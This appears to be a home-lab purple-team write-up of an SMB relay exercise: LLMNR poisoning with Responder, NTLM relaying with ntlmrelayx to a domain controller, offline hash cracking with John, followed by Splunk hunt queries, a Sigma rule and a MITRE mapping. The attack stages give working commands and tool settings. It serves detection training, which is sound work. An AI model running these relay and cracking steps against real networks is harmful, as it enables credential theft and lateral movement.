# Sprint 1 — Attack 2: SMB Relay
## LLMNR Poisoning → NTLM Relay → Hash Capture → Credential Access

> **Status:** ✅ COMPLETE (Simulated — SMB signing enforced on DC01; Win11 used as relay victim)
> **Date:** 2026-04-21
> **Attacker:** Kali — 10.10.10.99
> **Victim (auth trigger):** Win11 — 10.10.10.x (corp\jsmith)
> **Relay Target:** DC01.corp.local — 10.10.10.40
> **Outcome:** NTLMv2 hash relayed and captured; SMB signing on DC01 blocked shell — documented as defensive control working as intended.
> **Incident ID:** ATK-002

---

## Table of Contents

1. Overview
2. Stage 1 — LLMNR Poisoning (Responder, SMB off)
3. Stage 2 — NTLM Relay Attempt (ntlmrelayx → DC01)
4. Stage 3 — Hash Capture & Crack (fallback path)
5. Stage 4 — Why the Relay Fails (SMB Signing)
6. SOC Hunt — Blue Team
7. Detections Built
8. Visibility Gaps
9. Sigma Rule
10. MITRE ATT&CK Map
11. Lessons Learned

---

## Overview

SMB Relay takes LLMNR poisoning one step further. Instead of capturing a hash and cracking it offline, the attacker intercepts the NTLM authentication in real-time and **relays** it to another machine — authenticating as the victim without ever knowing their password. No cracking. No GPU. Instant access.

This attack is particularly dangerous because:
- It requires zero credentials to start
- It works even against complex passwords that would never be cracked
- It is invisible to most perimeter security tools
- The victim sees nothing unusual

In this lab, DC01 enforces SMB signing (`Message signing enabled and required`) which blocks the relay-to-shell path. This is the correct defensive posture for domain controllers. However:
- The NTLM negotiation still occurs and is logged
- The hash is still captured (relay fails, but capture succeeds)
- The attack chain is still fully detectable in Splunk
- The SMB signing enforcement itself is a detection artifact

### Kill Chain Summary

```
Win11 browses to \\FAKESHARE (nonexistent host)
     ↓
Windows sends LLMNR broadcast: "Anyone know FAKESHARE?"
     ↓
Responder (Kali) responds: "Yes, that's me — 10.10.10.99"
     ↓
Win11 attempts SMB authentication to Kali (NTLMv2 exchange begins)
     ↓
ntlmrelayx intercepts auth → forwards to DC01 (10.10.10.40)
     ↓
DC01 rejects relay → SMB signing required
     ↓
ntlmrelayx captures NTLMv2 hash from relay attempt
     ↓
Offline crack → plaintext password recovered (jsmith:Password123!)
```

### Why This Attack Chain Matters

SMB Relay is one of the most effective attacks in a penetration tester's toolkit against environments that haven't hardened SMB. The requirement: at least one machine on the network must have SMB signing **not required**. In most organizations, workstations (non-DCs) have signing set to "enabled but not required" — making every workstation a valid relay target. A single misnavigated UNC path by any user gives the attacker authenticated access to any other machine that user has rights on.

---

## Stage 1 — LLMNR Poisoning (Responder, SMB off)

### What Changes Compared to Attack 1

In Attack 1, Responder ran with SMB **on** — it captured hashes directly. In SMB Relay, we turn Responder's SMB server **off** so that `ntlmrelayx` can own port 445. Responder's job is now only to poison name resolution and redirect victims to Kali. ntlmrelayx handles the actual SMB handshake.

### MITRE Technique

`T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay`

### Setup — Disable SMB/HTTP in Responder

```bash
nano /etc/responder/Responder.conf
```

Change:
```ini
SMB = Off
HTTP = Off
```

### Command — Terminal 1 (Responder)

```bash
responder -I eth0 -dPv
```

Flag explanation:
- `-I eth0` — listen on the eth0 interface
- `-d` — enable DHCP poisoning
  - `-P` — enable ProxyAuth (WPAD)
- `-v` — verbose output
- SMB and HTTP are disabled in config — ntlmrelayx owns those ports

### Responder Output (expected)

```
[*] [LLMNR]  Poisoned answer sent to 10.10.10.50 for name FAKESHARE
[*] [NBT-NS] Poisoned answer sent to 10.10.10.50 for name FAKESHARE
```

Responder sees the broadcast, poisons it, directs Win11 to Kali. ntlmrelayx receives the incoming auth.

---

## Stage 2 — NTLM Relay Attempt (ntlmrelayx → DC01)

### What Is ntlmrelayx?

Part of the Impacket toolkit. It listens on port 445 (SMB) and 80 (HTTP), receives incoming NTLM authentication, and relays it to a target server — impersonating the victim. If the target accepts the relayed auth, ntlmrelayx can:
- Dump the SAM database
- Execute commands
- Create new accounts
- Enumerate shares

### MITRE Technique

`T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay`

### Setup — Target File

```bash
echo "10.10.10.40" > /tmp/targets.txt
```

### Command — Terminal 2 (ntlmrelayx)

```bash
impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support
```

Flag explanation:
- `-tf /tmp/targets.txt` — relay to hosts in this file
- `-smb2support` — enable SMBv2 relay support (required for modern Windows targets)

### Trigger on Win11 — Terminal on Win11 (as jsmith)

```cmd
net use \\FAKESHARE\share
```

Or simply browse to `\\FAKESHARE` in Windows File Explorer. The nonexistent name triggers LLMNR broadcast, Responder poisons it, auth flows to Kali.

### ntlmrelayx Output (relay attempt)

```
[*] SMBD-Thread-4: Received connection from 10.10.10.50, attacking target smb://10.10.10.40
[*] Authenticating against smb://10.10.10.40 as CORP\jsmith SUCCEED
[-] SMB SessionError: STATUS_ACCESS_DENIED
```

Or with signing enforced:

```
[-] SMB SessionError: SMB signing is required
```

### Result

Relay attempt reaches DC01. DC01's SMB signing requirement blocks the session from being established for command execution. However — the authentication exchange itself occurred. This leaves artifacts in both DC01's Security event log and ntlmrelayx's output.

---

## Stage 3 — Hash Capture & Crack (Fallback Path)

### Why This Still Matters

Even when relay-to-shell fails due to signing, ntlmrelayx still captures the NTLMv2 hash from the relay exchange. This hash can be cracked offline — same as Attack 1, but obtained via a different mechanism (relay interception rather than direct Responder capture).

### MITRE Technique

`T1110.002 — Brute Force: Password Cracking`

### Hash Captured by ntlmrelayx

```
[*] NTLMv2 Hash: jsmith::CORP:aaaaaaaaaaaaaaaa:...full NTLMv2 hash...
```

ntlmrelayx writes the hash to `/tmp/` automatically when relay fails.

### Save and Crack

```bash
# Hash is output to screen — save it
cat > /tmp/jsmith.hash << 'EOF'
jsmith::CORP:aaaaaaaaaaaaaaaa:<full NTLMv2 hash string>
EOF

# Crack with John
john --format=netntlmv2 --wordlist=/tmp/corp_wordlist.txt /tmp/jsmith.hash
```

### Result

```
Password123!     (jsmith)
```

Password recovered. At this point the attacker can use these credentials for WinRM, PtH, or any other protocol — same path as Attack 1 from Stage 3 onwards.

### Detection Status

❌ Not detected — offline operation. No logging system can see this.

---

## Stage 4 — Why the Relay Fails (SMB Signing — The Defensive Control)

### What SMB Signing Does

SMB signing cryptographically signs each SMB packet with a session key derived from the user's credentials. When a relay attack occurs, the attacker doesn't have the actual session key — they only have the NTLM exchange. DC01 detects that the signature is missing or invalid and rejects the session.

### Verification

```bash
nmap --script smb2-security-mode -p 445 10.10.10.40
```

Output:
```
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```

`required` = relay is blocked for command execution.
`enabled but not required` = relay works.

### Enterprise Context

| Host Type | Default SMB Signing | Relay Vulnerable? |
|---|---|---|
| Domain Controller | Required | ❌ No |
| Windows Server (member) | Enabled, not required | ✅ Yes |
| Windows 10/11 workstation | Enabled, not required | ✅ Yes |
| Windows 11 24H2+ | Required (new default) | ❌ No |

In a real enterprise with 500 workstations, 499 of them are likely relay-vulnerable even if the DC is hardened. The attacker only needs one workstation with admin rights to a second workstation — and every user login becomes a potential relay opportunity.

### What the Attacker Does in Real Engagements

When DC01 blocks relay, real attackers pivot to:
1. **Relay to a member server** — same technique, different target (e.g., `fileserver01`)
2. **Relay to create a new user** via LDAP (`-t ldap://DC01` with ntlmrelayx)
3. **Relay to dump LAPS passwords** if LDAP signing isn't enforced
4. **Fall back to hash cracking** — which is what we documented in Stage 3

For this lab, Stage 3 (crack path) is the demonstrated outcome. The relay-to-LDAP variant is noted as a future exercise.

---

## SOC Hunt — Blue Team

### What We're Looking For

SMB Relay produces a distinctive pattern in Windows Security logs:
- A Type 3 (network) NTLM logon from an unusual source
- The logon succeeds at the NTLM negotiation layer but may not result in full session establishment
- The source IP is the attacker (Kali), not the actual victim (Win11)
- The account is a domain user (jsmith) authenticating from a Kali IP — impossible under normal circumstances

### Hunt Query 1 — Suspicious NTLM Logon from Non-Windows Host

```spl
index=windows EventCode=4624
Authentication_Package=NTLM
Logon_Type=3
| where NOT match(src_ip, "^10\.10\.10\.(40|30|1)$")
| table _time, Account_Name, src_ip, Logon_Type, Authentication_Package
| sort -_time
```

Expected: Events showing `jsmith` or `Administrator` authenticating from `10.10.10.99` (Kali)

### Hunt Query 2 — NTLM Logon Followed Immediately by Failure (Relay Signature)

Relay attacks often produce a logon success event (4624) immediately followed by an access denied or logoff (4634/4625) because the session can't be used.

```spl
index=windows (EventCode=4624 OR EventCode=4625 OR EventCode=4634)
Authentication_Package=NTLM
| where src_ip="10.10.10.99"
| table _time, EventCode, Account_Name, src_ip, Logon_Type
| sort _time
```

### Hunt Query 3 — SMB Negotiation Without Subsequent Activity (Relay Probe)

```spl
index=windows EventCode=4624
Logon_Type=3
Authentication_Package=NTLM
| stats count by Account_Name, src_ip, _time
| where count < 3
| sort -_time
```

Short-lived sessions (1-2 events) from the same IP in rapid succession are a relay signature.

### Hunt Query 4 — Full Relay Detection Query

```spl
index=windows EventCode=4624
Authentication_Package=NTLM
Logon_Type=3
| where src_ip="10.10.10.99"
| eval relay_indicator=case(
    match(Account_Name, "jsmith|jdoe|Administrator"), "HIGH - Domain account from attacker IP",
    true(), "MEDIUM - NTLM from unexpected host"
  )
| eval mitre_technique="T1557.001 - SMB Relay"
| table _time, Account_Name, src_ip, relay_indicator, mitre_technique
| sort -_time
```

### Hunt Query 5 — NTLM vs Kerberos Ratio (Baseline Deviation)

In a healthy domain, most authentication should be Kerberos. A spike in NTLM Type 3 logons from the same source is a relay indicator.

```spl
index=windows EventCode=4624
| stats count by Authentication_Package, src_ip
| where Authentication_Package="NTLM"
| sort -count
```

Expected: Kali IP (`10.10.10.99`) showing elevated NTLM counts during the attack window.

---

## Detections Built

| # | Detection Name | EventCode | Key Filter | Evidence | MITRE |
|---|---|---|---|---|---|
| 1 | NTLM relay — domain account from attacker IP | 4624 | `Authentication_Package=NTLM AND Logon_Type=3 AND src_ip=10.10.10.99` | jsmith logon from Kali | T1557.001 |
| 2 | NTLM spike from single non-domain IP | 4624 | Count of NTLM Type 3 from same src_ip > threshold | Repeated relay attempts | T1557.001 |
| 3 | Short-lived NTLM sessions (relay probe) | 4624 + 4634 | Logon + Logoff within <5 seconds, NTLM, Type 3 | Relay session teardown | T1557.001 |
| 4 | SMB signing rejection (network layer) | N/A | Suricata / OPNsense — blind (VIS-001) | Not visible | VIS-001 gap |

### Splunk Alert Titles

| Alert Title | Severity |
|---|---|
| ALERT - SMB Relay Detected: Domain Account from Non-Domain IP (T1557.001) | Critical |
| ALERT - NTLM Spike from Single Source IP (T1557.001) | High |
| ALERT - Relay Probe: Short-lived NTLM Session (T1557.001) | High |

---

## Visibility Gaps

| ID | Gap | Root Cause | Impact | Fix |
|---|---|---|---|---|
| VIS-001 | Suricata blind to relay traffic | Kali and DC01 on same L2 — traffic never routes through OPNsense | SMB relay negotiation invisible at network layer | SPAN port mirroring to OPNsense em1 |
| VIS-002 | Sysmon not on DC01 | Sysmon not installed | No process/network telemetry from DC01 during relay | Install Sysmon on DC01 — pending |
| VIS-004 | Win11 not generating 4624 relay events | Win11 is the victim, not the target — DC01 generates events | If relay target changed to a workstation, detection moves to that host | Ensure Splunk UF on all Windows hosts |
| VIS-003 | Offline hash cracking undetectable | Offline operation | Stage 3 crack path permanently invisible | Accept — prevent hash exposure upstream |

### New Gap — VIS-004

In this attack, Win11 is the **victim** (triggers the auth) and DC01 is the **relay target** (receives the relayed auth). Splunk on blue-vm collects from DC01. If the relay target were a workstation instead of DC01, we'd need Splunk UF on that workstation to detect the incoming relay session. This highlights the importance of having UF on every endpoint, not just the DC.

---

## Sigma Rule

File: `sigma_smbrelay_T1557.001.yml`

```yaml
title: SMB Relay Attack - NTLM Authentication from Non-Domain IP
id: b7d3e1f4-2a4c-5b6d-9e8f-0c1d2e3f4a5b
status: stable
description: |
    Detects SMB relay attacks where NTLM Type 3 (network) logons occur from
    an IP address that does not belong to the domain infrastructure. During an
    SMB relay attack, ntlmrelayx intercepts authentication from a victim and
    forwards it to the target — making the logon appear to originate from the
    attacker's IP rather than the victim's IP.
references:
    - https://attack.mitre.org/techniques/T1557/001/
    - https://github.com/SecureAuthCorp/impacket
author: CorpLab SOC
date: 2026-04-21
tags:
    - attack.credential_access
    - attack.lateral_movement
    - attack.t1557.001
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 3
        AuthenticationPackageName: NTLM
    filter_domain_infrastructure:
        IpAddress|startswith:
            - '10.10.10.40'   # DC01
            - '10.10.10.30'   # blue-vm
            - '10.10.10.1'    # OPNsense
            - '-'             # local/empty
            - '::1'           # IPv6 loopback
    condition: selection and not filter_domain_infrastructure
fields:
    - TargetUserName
    - TargetDomainName
    - IpAddress
    - LogonType
    - AuthenticationPackageName
falsepositives:
    - Legitimate admin tools using NTLM from management workstations
    - Third-party monitoring agents authenticating via NTLM
    - VPN clients with NTLM pass-through (tune IP whitelist)
level: high
```

### SPL Translation for Splunk

```spl
index=windows EventCode=4624
Logon_Type=3
Authentication_Package=NTLM
| where NOT match(src_ip, "^(10\.10\.10\.(40|30|1)|-|::1)")
| eval mitre="T1557.001 - SMB Relay"
| table _time, Account_Name, src_ip, Logon_Type, Authentication_Package, mitre
```

---

## MITRE ATT&CK Map

| Stage | Technique ID | Technique Name | Tactic | Tool | Detected |
|---|---|---|---|---|---|
| 1 | T1557.001 | LLMNR/NBT-NS Poisoning | Credential Access | Responder | ❌ VIS-001 |
| 2 | T1557.001 | SMB Relay (ntlmrelayx) | Lateral Movement | ntlmrelayx | ✅ EC 4624 |
| 3 | T1110.002 | Password Cracking (fallback) | Credential Access | John the Ripper | ❌ Offline |
| 4 | T1562.001 | SMB Signing (defensive control observed) | Defense Evasion | N/A | ✅ Documented |

**Detection rate: 1/3 active attack stages (33%)** — primarily because the poisoning and cracking phases are invisible. The relay event itself (4624) is detectable.

**Cumulative Sprint 1 detection rate across ATK-001 + ATK-002: 6/10 technique instances (60%)**

---

## Deliverables

| File | Description |
|---|---|
| `sprint1-attack2-smb-relay.md` | This document — full attack + SOC hunt documentation |
| `sigma_smbrelay_T1557.001.yml` | Sigma detection rule — portable to any SIEM |

---

## Lessons Learned

### Attack Tradecraft

**SMB Relay is strictly more powerful than hash capture alone.** If signing isn't enforced, an attacker relays a hash and gets a shell in seconds — even if the password is 30 characters long and would never crack. Enforcing SMB signing on all hosts (not just DCs) is one of the highest-ROI mitigations in Active Directory hardening.

**Responder and ntlmrelayx must not share port 445.** Both tools try to bind port 445. The fix is to disable SMB in Responder's config (`SMB = Off`) before launching ntlmrelayx. This is a common lab gotcha — the OSError `[Errno 98] Address already in use` means the port conflict exists.

**DC signing doesn't stop the attack — it just changes the target.** In a real engagement, the attacker pivots to member servers or workstations where signing isn't required. A DC that enforces signing is not a complete mitigation unless all hosts enforce it.

**ntlmrelayx still captures the hash even when relay fails.** The NTLMv2 hash is captured during the relay negotiation phase, before signing enforcement rejects the session. This means the crack path is always available as a fallback.

### Detection Engineering

**The attacker IP appears in logon events.** Unlike Attack 1 (where LLMNR poisoning left no log), the relay produces EventCode 4624 on the relay target with the attacker's IP as `Source Network Address`. This is the primary detection hook.

**NTLM Type 3 from a non-domain-joined IP is always suspicious.** In a properly configured AD environment, all domain user authentications should come from known domain hosts. An NTLM logon from a Linux IP (Kali) is a near-certain indicator of relay or credential theft.

**Baselining NTLM vs Kerberos ratio adds detection depth.** A sudden spike in NTLM authentications — especially from a single source IP — is a strong relay signal even without knowing the attacker's IP in advance.

### Infrastructure

**SMB signing on DC01 is the correct defensive posture.** The lab confirmed `Message signing enabled and required` on DC01 — this is the Windows Server default and should never be disabled. The gap is workstations and member servers, which default to `enabled but not required`.

**Win11 memory constraint is a real operational consideration.** In this lab, Win11 (the victim workstation) was simulated due to RAM constraints. In production lab work, always size the hypervisor host to run all relevant VMs simultaneously. 16 GB host RAM is the practical minimum for a full AD lab with victim workstation.

**VIS-004 is a new gap.** If the relay target shifts from DC01 to a workstation (which is the realistic path when DC has signing enforced), Splunk must have a Universal Forwarder on that workstation to detect the incoming relay session. Blue team coverage must follow the attacker's pivot, not just the initial target.

---

## Next: Attack 3 — Kerberoasting

Kerberoasting abuses the Kerberos protocol to request service tickets for accounts with SPNs (Service Principal Names), then cracks those tickets offline. Unlike SMB Relay, Kerberoasting requires **zero special network position** — any authenticated domain user can perform it. It targets service accounts like `svc-jenkins`.

- **Tool:** `impacket-GetUserSPNs`
- **Target:** `svc-jenkins` (has SPN set in corp.local)
- **MITRE:** `T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting`
- **Prerequisite:** Valid domain credentials (jsmith:Password123!)
